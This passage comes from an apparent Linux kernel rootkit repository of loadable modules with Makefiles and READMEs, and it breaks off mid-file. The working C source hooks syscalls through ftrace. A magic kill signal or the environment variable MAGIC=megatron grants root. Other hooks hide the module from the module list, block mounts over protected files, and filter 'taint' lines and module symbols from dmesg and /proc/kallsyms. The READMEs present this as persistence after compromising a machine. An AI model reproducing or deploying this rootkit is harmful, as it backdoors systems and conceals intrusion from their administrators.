 * can go ahead and install the hook with ftrace. This is done by setting the 
 * ops field of hook (see the comment below for more details), and then using
 * the built-in ftrace_set_filter_ip() and register_ftrace_function() functions
 * provided by ftrace.h
 * */
int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if(err)
        return err;

    /* For many function hooks (especially non-trivial ones), the $rip
     * register gets modified, so we have to alert ftrace to this fact. This
     * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
     * need to OR the RECURSION_SAFE flag (effectively turning it OFF) because
     * the built-in anti-recursion guard provided by ftrace is useless if
     * we're modifying $rip. This is why we have to implement our own checks
     * (see USE_FENTRY_OFFSET). */
    hook->ops.func = (ftrace_func_t)fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
	   | FTRACE_OPS_FL_RECURSION
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

/* Disabling our function hook is just a simple matter of calling the built-in
 * unregister_ftrace_function() and ftrace_set_filter_ip() functions (note the
 * opposite order to that in fh_install_hook()).
 * */
void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

/* To make it easier to hook multiple functions in one module, this provides
 * a simple loop over an array of ftrace_hook struct
 * */
int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++)
    {
        err = fh_install_hook(&hooks[i]);
        if(err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0 ; i < count ; i++)
        fh_remove_hook(&hooks[i]);
}

```

`Ring0/Protecting-Files/trev_kit.c`:

```c
#include <linux/init.h> 
#include <linux/module.h>
#include <linux/kernel.h> 
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/cred.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/fdtable.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Trevohack");
MODULE_DESCRIPTION("LKM Library");
MODULE_VERSION("0.02");

#define TARGET_FILE "/root/data.txt"
#define TARGET_CONTENT "hello\n"
#define TARGET_CONTENT_SIZE (sizeof(TARGET_CONTENT) - 1)

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

static struct list_head *prev_module;
static short hidden = 0;

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_mount)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_write)(const struct pt_regs *);

asmlinkage long hook_mount(const struct pt_regs *regs)
{
    char __user *source = (void *)regs->si;
    char __user *target = (void *)regs->di;

    char *target_buf;
    char *source_buf;

    target_buf = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!target_buf) return -ENOMEM;
    
    source_buf = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!source_buf){
        kfree(target_buf);
        return -ENOMEM;
    }
    

    if (copy_from_user(source_buf, source, PATH_MAX)){
        kfree(source_buf);
        kfree(target_buf);
        return -EFAULT;
    }

    if (copy_from_user(target_buf, target, PATH_MAX)){
        kfree(source_buf);
        kfree(target_buf);
        return -EFAULT;
    }

    if (   strcmp(source_buf, TARGET_FILE) == 0 || strcmp(source_buf, "/root") == 0
        || strcmp(source_buf, "/")         == 0 || strcmp(target_buf, TARGET_FILE) == 0 
        || strcmp(target_buf, "/root")     == 0 || strcmp(target_buf, "/") == 0)  {
        
        kfree(source_buf);
        kfree(target_buf);
        return 0;
    }

    kfree(source_buf);
    kfree(target_buf);
    return orig_mount(regs);
}

asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = regs->si;
    void showme(void);
    void hideme(void);
    void set_root(void);

    if (sig == 44 && hidden == 0) {
        hideme();
        hidden = 1;
        return 0;
    } else if (sig == 44 && hidden == 1) {
        showme();
        hidden = 0;
        return 0;
    } else if (sig == 45) {
        set_root();
        return 0;
    }

    return orig_kill(regs);
}

asmlinkage long hook_write(const struct pt_regs *regs)
{
    int fd = regs->di;
    size_t count = regs->dx;
    struct file *file;
    struct path path;
    char *buf_path = kmalloc(PATH_MAX, GFP_KERNEL);
    char *tmp;

    if (!buf_path)
        return -ENOMEM;

    file = fcheck(fd);
    if (file) {
        path = file->f_path;
        path_get(&file->f_path);
        tmp = d_path(&path, buf_path, PATH_MAX);
        path_put(&path);
        if (!IS_ERR(tmp) && strcmp(tmp, TARGET_FILE) == 0) {
            file = filp_open(TARGET_FILE, O_WRONLY | O_CREAT, 0644);
            if (!IS_ERR(file)) {
                kernel_write(file, TARGET_CONTENT, TARGET_CONTENT_SIZE, 0);
                filp_close(file, NULL);
            }
            kfree(buf_path);
            return count; 
        }
    }

    kfree(buf_path);
    return orig_write(regs);
}
#else
static asmlinkage long (*orig_mount)(char *dev_name, char *dir_name, char *type, unsigned long flags, void *data);
static asmlinkage long (*orig_kill)(pid_t pid, int sig);
static asmlinkage long (*orig_write)(unsigned int fd, const char __user *buf, size_t count);

asmlinkage long hook_mount(char *dev_name, char *dir_name, char *type, unsigned long flags, void *data)
{
    char *dir_buf = kmalloc(PATH_MAX, GFP_KERNEL);

    if (!dir_buf)
        return -ENOMEM;

    if (copy_from_user(dir_buf, dir_name, PATH_MAX)) {
        kfree(dir_buf);
        return -EFAULT;
    }

    if (strcmp(dir_buf, "/") == 0 || strcmp(dir_buf, "/root") == 0 || strcmp(dir_buf, "/root/king.txt") == 0) {
        kfree(dir_buf);
        return -EPERM;
    }

    kfree(dir_buf);
    return orig_mount(dev_name, dir_name, type, flags, data);
}

asmlinkage long hook_kill(pid_t pid, int sig)
{
    void showme(void);
    void hideme(void);
    void set_root(void);

    if (sig == 44 && hidden == 0) {
        hideme();
        hidden = 1;
        return 0;
    } else if (sig == 44 && hidden == 1) {
        showme();
        hidden = 0;
        return 0;
    } else if (sig == 45) {
        set_root();
        return 0;
    }

    return orig_kill(pid, sig);
}

asmlinkage long hook_write(unsigned int fd, const char __user *buf, size_t count)
{
    struct file *file;
    struct path path;
    char *buf_path = kmalloc(PATH_MAX, GFP_KERNEL);
    char *tmp;

    if (!buf_path)
        return -ENOMEM;

    file = fcheck(fd);
    if (file) {
        path = file->f_path;
        path_get(&file->f_path);
        tmp = d_path(&path, buf_path, PATH_MAX);
        path_put(&path);
        if (!IS_ERR(tmp) && strcmp(tmp, TARGET_FILE) == 0) {
            file = filp_open(TARGET_FILE, O_WRONLY | O_CREAT, 0644);
            if (!IS_ERR(file)) {
                kernel_write(file, TARGET_CONTENT, TARGET_CONTENT_SIZE, 0);
                filp_close(file, NULL);
            }
            kfree(buf_path);
            return count; 
        }
    }

    kfree(buf_path);
    return orig_write(fd, buf, count);
}
#endif

void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;
    commit_creds(root);
}

static struct ftrace_hook hooks[] = {
    HOOK("sys_mount", hook_mount, &orig_mount),
    HOOK("sys_kill", hook_kill, &orig_kill),
    HOOK("sys_write", hook_write, &orig_write),
};

static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        return err;

    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rootkit_init);
module_exit(rootkit_exit);

```

`Ring0/arm/Makefile`:

```
obj-m := hook.o
CC = gcc -Wall 
KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

```

`Ring0/arm/README.md`:

```md
# **Becoming root by doing syscall hooking**

Assuming you are a normal user, without permission to access /root, among other files and directories in which you do not have permission, you can create an LKM that hooks the kill syscall `sys_kill`, so that every time you return to the machine with a user with the lowest possible privilege, you are root. (for this you would have to have root before, that is, load LKM as soon as you compromised the machine).

The C code above is very simple, it basically declares a pointer to the original kill syscall function, so that it can be called after the hook. It checks if the kill signal is 59, if so, it calls the `SpawnRoot` function which basically changes its current id to 0 i.e. root, otherwise the original kill syscall function is called.

<p align="center"><img src="image.png"></p>

```

`Ring0/arm/ftrace_helper.h`:

```h
/*
 * Helper library for ftrace hooking kernel functions
 * Author: Harvey Phillips (xcellerator@gmx.com)
 * License: GPL
 * */

#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#if(LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define FTRACE_REGS_STRUCT ftrace_regs
#else
#define FTRACE_REGS_STRUCT pt_regs
#endif


/*
 * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported, 
 * so we have to use kprobes to get the address.
 * Full credit to @f0lg0 for the idea.
 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}

/* We need to prevent recursive loops when hooking, otherwise the kernel will
 * panic and hang. The options are to either detect recursion by looking at
 * the function return address, or by jumping over the ftrace call. We use the 
 * first option, by setting USE_FENTRY_OFFSET = 0, but could use the other by
 * setting it to 1. (Ordinarily ftrace provides its own protections against
 * recursion, but it relies on saving return registers in $rip. We will likely
 * need the use of the $rip register in our hook, so we have to disable this
 * protection and implement our own).
 * */
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

/* We pack all the information we need (name, hooking function, original function)
 * into this struct. This makes it easier for setting up the hook and just passing
 * the entire struct off to fh_install_hook() later on.
 * */
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

/* Ftrace needs to know the address of the original function that we
 * are going to hook. As before, we just use kallsyms_lookup_name() 
 * to find the address in kernel memory.
 * */
static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
#endif
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->original) = hook->address;
#endif

    return 0;
}

/* See comment below within fh_install_hook() */
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct  FTRACE_REGS_STRUCT *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
    regs->pc = (unsigned long) hook->function;
#else
    if (!within_module(parent_ip, THIS_MODULE))
        regs->pc = (unsigned long) hook->function;
#endif
}

/* Assuming we've already set hook->name, hook->function and hook->original, we 
 * can go ahead and install the hook with ftrace. This is done by setting the 
 * ops field of hook (see the comment below for more details), and then using
 * the built-in ftrace_set_filter_ip() and register_ftrace_function() functions
 * provided by ftrace.h
 * */
int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if(err)
        return err;

    /* For many function hooks (especially non-trivial ones), the $rip
     * register gets modified, so we have to alert ftrace to this fact. This
     * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
     * need to OR the RECURSION_SAFE flag (effectively turning it OFF) because
     * the built-in anti-recursion guard provided by ftrace is useless if
     * we're modifying $rip. This is why we have to implement our own checks
     * (see USE_FENTRY_OFFSET). */
    hook->ops.func = (ftrace_func_t)fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS_IF_SUPPORTED
	   | FTRACE_OPS_FL_RECURSION
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter(&hook->ops,(unsigned char *) hook->name, strlen(hook->name), 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

/* Disabling our function hook is just a simple matter of calling the built-in
 * unregister_ftrace_function() and ftrace_set_filter_ip() functions (note the
 * opposite order to that in fh_install_hook()).
 * */
void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter(&hook->ops,  NULL, 0, 1);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

/* To make it easier to hook multiple functions in one module, this provides
 * a simple loop over an array of ftrace_hook struct
 * */
int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++)
    {
        err = fh_install_hook(&hooks[i]);
        if(err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0 ; i < count ; i++)
        fh_remove_hook(&hooks[i]);
}

```

`Ring0/arm/hook.c`:

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include "ftrace_helper.h" //xcellerator ftrace_helper.h

MODULE_LICENSE("GPL");
MODULE_AUTHOR("malefax");
MODULE_AUTHOR("mathuez");
MODULE_DESCRIPTION("Simple sys_kill hook using ftrace");

static asmlinkage long(*orig_kill)(const struct pt_regs *);
typedef asmlinkage long (*orig_getuid_t)(const struct pt_regs *);
static  orig_getuid_t orig_getuid;

static asmlinkage int hook_kill(const struct pt_regs *regs){

        void SpawnRoot(void);

        int signal;
        signal = regs->regs[1];

        if(signal == 59){
                SpawnRoot();
                return 0;
        }

        return orig_kill(regs);
}

static asmlinkage long hook_getuid(const struct pt_regs *regs) {
    
     void rootmagic(void);

    const char *name = current->comm;

    struct mm_struct *mm;
    char *envs;
    int len, i;

    if (strcmp(name, "bash") == 0) {
        mm = current->mm;
        if (mm && mm->env_start && mm->env_end) {
            envs = kmalloc(PAGE_SIZE, GFP_ATOMIC);
            if (envs) {
                len = access_process_vm(current, mm->env_start, envs, PAGE_SIZE - 1, 0);
                if (len > 0) {
                    for (i = 0; i < len - 1; i++) {
                        if (envs[i] == '\0')
                            envs[i] = ' ';
                    }
                    if (strstr(envs, "MAGIC=megatron")) {
                         rootmagic();
                    }
                }
                kfree(envs);
            }
        }
    }
    return orig_getuid(regs);
}


void SpawnRoot(void){
        struct cred *newcredentials;
        newcredentials = prepare_creds();

        if(newcredentials == NULL){
                return;
        }
        newcredentials->uid.val = 0;
        newcredentials->gid.val = 0;
        newcredentials->suid.val = 0;
        newcredentials->fsuid.val = 0;
        newcredentials->euid.val = 0;
      
         commit_creds(newcredentials);
}

 void rootmagic(void){
  struct cred *creds;
  creds = prepare_creds();
  if(creds == NULL){
    return;
  }
  creds->uid.val = creds->gid.val = 0;
  creds->euid.val = creds->egid.val = 0;
  creds->suid.val = creds->sgid.val = 0;
  creds->fsuid.val = creds->fsgid.val = 0;
  commit_creds(creds);
}

static struct ftrace_hook hooks[] = {
                HOOK("__arm64_sys_kill", hook_kill, &orig_kill),
                HOOK("__arm64_sys_getuid", hook_getuid, &orig_getuid),
};

static int __init mangekyou_init(void){
        int error; 
        error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
        if(error){
                return error;
        }
      /*  if ( try_module_get(THIS_MODULE) ){
                pr_info("Increase refrence count");
        }
        else {
                THIS_MODULE->state=MODULE_STATE_GOING;
        }*/        
                return 0;
}

static void __exit mangekyou_exit(void){
        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(mangekyou_init);
module_exit(mangekyou_exit);

```

`Ring0/become_root/Makefile`:

```
obj-m := hook.o
CC = gcc -Wall 
KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

```

`Ring0/become_root/README.md`:

```md
# **Becoming root by doing syscall hooking**

Assuming you are a normal user, without permission to access /root, among other files and directories in which you do not have permission, you can create an LKM that hooks the kill syscall `sys_kill`, so that every time you return to the machine with a user with the lowest possible privilege, you are root. (for this you would have to have root before, that is, load LKM as soon as you compromised the machine).

The C code above is very simple, it basically declares a pointer to the original kill syscall function, so that it can be called after the hook. It checks if the kill signal is 59, if so, it calls the `SpawnRoot` function which basically changes its current id to 0 i.e. root, otherwise the original kill syscall function is called.

<p align="center"><img src="image.png"></p>

```

`Ring0/become_root/ftrace_helper.h`:

```h
/*
 * Helper library for ftrace hooking kernel functions
 * Author: Harvey Phillips (xcellerator@gmx.com)
 * License: GPL
 * */

#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/*
 * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported, 
 * so we have to use kprobes to get the address.
 * Full credit to @f0lg0 for the idea.
 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}

/* We need to prevent recursive loops when hooking, otherwise the kernel will
 * panic and hang. The options are to either detect recursion by looking at
 * the function return address, or by jumping over the ftrace call. We use the 
 * first option, by setting USE_FENTRY_OFFSET = 0, but could use the other by
 * setting it to 1. (Ordinarily ftrace provides its own protections against
 * recursion, but it relies on saving return registers in $rip. We will likely
 * need the use of the $rip register in our hook, so we have to disable this
 * protection and implement our own).
 * */
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

/* We pack all the information we need (name, hooking function, original function)
 * into this struct. This makes it easier for setting up the hook and just passing
 * the entire struct off to fh_install_hook() later on.
 * */
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

/* Ftrace needs to know the address of the original function that we
 * are going to hook. As before, we just use kallsyms_lookup_name() 
 * to find the address in kernel memory.
 * */
static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
#endif
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->original) = hook->address;
#endif

    return 0;
}

/* See comment below within fh_install_hook() */
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long) hook->function;
#else
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
#endif
}

/* Assuming we've already set hook->name, hook->function and hook->original, we 
 * can go ahead and install the hook with ftrace. This is done by setting the 
 * ops field of hook (see the comment below for more details), and then using
 * the built-in ftrace_set_filter_ip() and register_ftrace_function() functions
 * provided by ftrace.h
 * */
int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if(err)
        return err;

    /* For many function hooks (especially non-trivial ones), the $rip
     * register gets modified, so we have to alert ftrace to this fact. This
     * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
     * need to OR the RECURSION_SAFE flag (effectively turning it OFF) because
     * the built-in anti-recursion guard provided by ftrace is useless if
     * we're modifying $rip. This is why we have to implement our own checks
     * (see USE_FENTRY_OFFSET). */
    hook->ops.func = (ftrace_func_t)fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
	   | FTRACE_OPS_FL_RECURSION
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

/* Disabling our function hook is just a simple matter of calling the built-in
 * unregister_ftrace_function() and ftrace_set_filter_ip() functions (note the
 * opposite order to that in fh_install_hook()).
 * */
void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

/* To make it easier to hook multiple functions in one module, this provides
 * a simple loop over an array of ftrace_hook struct
 * */
int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++)
    {
        err = fh_install_hook(&hooks[i]);
        if(err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0 ; i < count ; i++)
        fh_remove_hook(&hooks[i]);
}

```

`Ring0/become_root/hook.c`:

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include "ftrace_helper.h" //xcellerator ftrace_helper.h

MODULE_LICENSE("GPL");
MODULE_AUTHOR("syscall hooking");
MODULE_AUTHOR("malefax");
MODULE_DESCRIPTION("Simple sys_kill hook using ftrace");

static asmlinkage long(*orig_kill)(const struct pt_regs *);
typedef asmlinkage long (*orig_getuid_t)(const struct pt_regs *);
static  orig_getuid_t orig_getuid;

static asmlinkage int hook_kill(const struct pt_regs *regs){

        void SpawnRoot(void);

        int signal;
        signal = regs->si;

        if(signal == 59){
                SpawnRoot();
                return 0;
        }

        return orig_kill(regs);
}

static asmlinkage long hook_getuid(const struct pt_regs *regs) {
    
     void rootmagic(void);

    const char *name = current->comm;

    struct mm_struct *mm;
    char *envs;
    int len, i;

    if (strcmp(name, "bash") == 0) {
        mm = current->mm;
        if (mm && mm->env_start && mm->env_end) {
            envs = kmalloc(PAGE_SIZE, GFP_ATOMIC);
            if (envs) {
                len = access_process_vm(current, mm->env_start, envs, PAGE_SIZE - 1, 0);
                if (len > 0) {
                    for (i = 0; i < len - 1; i++) {
                        if (envs[i] == '\0')
                            envs[i] = ' ';
                    }
                    if (strstr(envs, "MAGIC=megatron")) {
                         rootmagic();
                    }
                }
                kfree(envs);
            }
        }
    }
    return orig_getuid(regs);
}


void SpawnRoot(void){
        struct cred *newcredentials;
        newcredentials = prepare_creds();

        if(newcredentials == NULL){
                return;
        }
        newcredentials->uid.val = 0;
        newcredentials->gid.val = 0;
        newcredentials->suid.val = 0;
        newcredentials->fsuid.val = 0;
        newcredentials->euid.val = 0;
      
         commit_creds(newcredentials);
}

 void rootmagic(void){
  struct cred *creds;
  creds = prepare_creds();
  if(creds == NULL){
    return;
  }
  creds->uid.val = creds->gid.val = 0;
  creds->euid.val = creds->egid.val = 0;
  creds->suid.val = creds->sgid.val = 0;
  creds->fsuid.val = creds->fsgid.val = 0;
  commit_creds(creds);
}

static struct ftrace_hook hooks[] = {
                HOOK("__x64_sys_kill", hook_kill, &orig_kill),
                HOOK("__x64_sys_getuid", hook_getuid, &orig_getuid),
};

static int __init mangekyou_init(void){
        int error; 
        error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
        if(error){
                return error;
        }
        if ( try_module_get(THIS_MODULE) ){
                pr_info("Increase refrence count");
        }
        else {
                THIS_MODULE->state=MODULE_STATE_GOING;
        }        
                return 0;
}

static void __exit mangekyou_exit(void){
        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(mangekyou_init);
module_exit(mangekyou_exit);

```

`Ring0/clear-taint-dmesg/Makefile`:

```
obj-m := matheuz.o
CC = gcc -Wall 
KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

```

`Ring0/clear-taint-dmesg/README.md`:

```md

## Hiding taint message from `/dev/kmsg` and `dmesg`.

This LKM hooks the read sycall to hide messages containing the word "taint" from `/dev/kmsg` and "matheuz" including the entire line from `/proc/kallsyms`, preventing our hooks and tainted messages from being read by the user.

Remembering this is a simple poc/demo, btw that the `dmesg` command uses `/dev/kmsg`, so it will automatically hide to `dmesg` too.

## Hiding all of matheuz.ko functions from `/proc/kallsyms`.

`/proc/kallsyms` is a file that contains the symbol table and provides all of the available functions and variables. The matheuz.ko `hook_read` function looks into this file everytime a user tries to read this file and it will filter out all the output and its line with the content `matheuz` for this POC demo's purposes.

### Hiding `taint` from /dev/kmsg
<p align="center"><img src="image.png"></p>

### Hiding from `/proc/kallsyms`
<p align="center"><img src="kallsyms.jpg"></p>

### Example of hiding from `/sys/kernel/tracing/touched_functions`

![hide](https://github.com/user-attachments/assets/4532ad99-52b8-47cf-9050-1b67ec071a77)

### Example of a lkm that doesnt use the read hook to filter lines containg the module name in `touched_functions`

![caught](https://github.com/user-attachments/assets/b0c42daa-1f97-409a-b7a9-225562dcff0e)

```

`Ring0/clear-taint-dmesg/ftrace.h`:

```h
#ifndef _FTRACE_H_
#define _FTRACE_H_

#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/kprobes.h>

#define KPROBE_LOOKUP 1

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}

#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
#endif
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        printk(KERN_DEBUG "DMESG: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->original) = hook->address;
#endif

    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    struct pt_regs *regs = ftrace_get_regs(fregs);

#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long) hook->function;
#else
